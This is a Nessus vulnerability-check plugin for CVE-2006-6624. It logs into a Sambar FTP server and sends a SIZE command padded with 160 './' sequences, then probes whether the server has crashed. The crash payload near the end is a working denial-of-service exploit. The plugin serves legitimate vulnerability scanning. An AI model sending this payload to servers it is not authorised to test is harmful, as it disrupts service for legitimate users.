#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(24020);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2006-6624");
  script_bugtraq_id(21617);
  script_xref(name:"OSVDB", value:"32336");
 
  script_name(english:"Sambar FTP Server Malformed SIZE Command DoS");
  script_summary(english:"Tries to crash Sambar Server with long FTP size command");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be using Sambar Server, a multi-service
application for Windows and Linux. 

The version of Sambar installed on the remote host crashes when its
FTP server component attempts to process a specially-crafted SIZE
command.  A authenticated remote attacker can leverage this flaw to
deny service to legitimate users." );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/2934" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:S/C:N/I:N/A:P" );
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"FTP");
 
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_keys("ftp/login", "ftp/password");
  script_exclude_keys("ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");
include("global_settings.inc");


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);


# Make sure the banner indicates it's Sambar.
banner = get_ftp_banner(port:port);
if (!banner || "Sambar FTP Server" >!< banner) exit(0);


# nb: to exploit the vulnerability we need to log in.
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");
if (!user) exit(0);


soc = open_sock_tcp(port);
if (!soc) exit(0);
if (!ftp_authenticate(socket:soc, user:user, pass:pass))
{
  close(soc);
  exit(1, "cannot login with supplied FTP credentials");
}


# Try to exploit the flaw to crash the daemon.
c = "SIZE ";
for (i=1; i<=160; i++) c += './';
send(socket:soc, data:string(c, "\r\n"));
s = ftp_recv_line(socket:soc);
ftp_close(socket:soc);
if (!isnull(s)) exit(0);


# The server doesn't crash right away so try for a bit to open a connection.
failed = 0;
tries = 5;
for (iter=0; iter<=tries; iter++)
{
  soc = open_sock_tcp(port);
  if (soc)
  {
    failed = 0;
    close(soc);
    sleep(1);
  }
  else
  {
    failed++;
    if (failed > 1)
    {
      security_warning(port);
      exit(0);
    }
  }
}

